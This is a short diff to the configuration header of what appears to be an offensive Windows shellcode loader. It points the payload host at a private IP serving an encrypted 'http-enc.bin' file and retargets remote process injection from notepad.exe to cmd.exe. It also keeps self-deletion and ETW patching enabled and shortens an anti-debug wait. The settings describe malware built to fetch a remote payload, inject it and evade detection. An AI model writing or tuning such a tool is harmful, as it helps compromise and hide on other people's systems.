@@ -14,7 +14,7 @@
 #define WEB 80
 //#define SECURE 443
 
-#define HOST L"127.0.0.1"
+#define HOST L"192.168.100.161"
 #define REMOTE_FILE L"http-enc.bin"
 #define LOCAL_FILE "C:\\Users\\nullb1t3\\Desktop\\http.bin"
 
@@ -41,15 +41,15 @@
   defined as well if not local is assumed
 -----------------------------------------*/
 #define REMOTE_INJECT
-#define PROC_NAME L"notepad.exe"
-//#define PID 8392
+#define PROC_NAME L"cmd.exe"
+//#define PID 1744
 
 
 /*------------------------------------------
  Anti-Debug constants
 ------------------------------------------*/
 #define SELF_DELETE		//Delete the file on disk after execution
-#define WAIT 2			//minutes
+#define WAIT 1			//minutes
 #define PATCH_ETW		//Attempt to patch ETW
 
 
